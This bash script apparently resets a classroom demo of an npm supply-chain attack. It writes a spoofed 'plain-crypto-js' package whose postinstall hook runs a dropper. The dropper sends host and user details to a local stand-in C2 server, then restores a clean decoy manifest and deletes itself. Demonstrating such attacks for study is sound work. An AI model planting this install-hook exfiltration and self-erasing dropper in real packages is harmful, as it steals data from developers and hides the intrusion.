#!/bin/bash

echo "[*] Resetting Axios Supply Chain Attack Demo Environment..."

# Set absolute paths to avoid issues with where the script is run from
BASE_DIR="/Users/jacksonetherchainstake/SC3010 Com Security/Project/demos/axios_attack"
REGISTRY_DIR="$BASE_DIR/simulated_npm_registry/plain-crypto-js"
VICTIM_DIR="$BASE_DIR/victim_project"

# 1. Clean the victim project
echo "[*] Cleaning victim project 'node_modules'..."
rm -rf "$VICTIM_DIR/node_modules"
rm -f "$VICTIM_DIR/package-lock.json"

# 2. Recreate the Malicious Manifest (package.json)
echo "[*] Restoring trapped package.json..."
cat << 'EOF' > "$REGISTRY_DIR/package.json"
{
  "name": "plain-crypto-js",
  "version": "4.2.1",
  "description": "JavaScript library of crypto standards.",
  "author": {
    "name": "Evan Vosberg"
  },
  "homepage": "http://github.com/brix/crypto-js",
  "scripts": {
    "test": "grunt",
    "postinstall": "node setup.js"
  }
}
EOF

# 3. Recreate the Malware Dropper (setup.js)
echo "[*] Restoring payload setup.js..."
cat << 'EOF' > "$REGISTRY_DIR/setup.js"
const http = require('http');
const os = require('os');
const fs = require('fs');

// 1. Gather System Information (Reconnaissance)
const payload = JSON.stringify({
    platform: os.platform(),
    release: os.release(),
    architecture: os.arch(),
    hostname: os.hostname(),
    username: os.userInfo().username
});

// 2. Exfiltrate to Attacker C2 Server
const options = {
    hostname: '127.0.0.1',
    port: 8000,
    path: '/',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': payload.length
    }
};

const req = http.request(options, (res) => {
    // 3. Anti-Forensics: Cover our tracks after successful beacon
    
    // Step A: Replace trapped package.json with clean package.md
    if (fs.existsSync('package.md')) {
        fs.copyFileSync('package.md', 'package.json');
        fs.unlinkSync('package.md'); // Remove the clean spoof file
    }
    
    // Step B: Self Delete the Dropper
    try {
        fs.unlinkSync(__filename);
    } catch (err) {
        // silently fail
    }
});

req.on('error', (error) => {
    // If the attacker C2 is down, do nothing to stay stealthy
});

req.write(payload);
req.end();
EOF

# 4. Recreate the Clean Decoy Manifest (package.md)
echo "[*] Restoring decoy package.md..."
cat << 'EOF' > "$REGISTRY_DIR/package.md"
{
  "name": "plain-crypto-js",
  "version": "4.2.0",
  "description": "JavaScript library of crypto standards.",
  "license": "MIT",
  "author": {
    "name": "Evan Vosberg",
    "url": "http://github.com/evanvosberg"
  },
  "homepage": "http://github.com/brix/crypto-js",
  "repository": {
    "type": "git",
    "url": "http://github.com/brix/crypto-js.git"
  },
  "main": "index.js",
  "dependencies": {}
}
EOF

echo "[+] Done! The Axios demo environment is ready for recording."
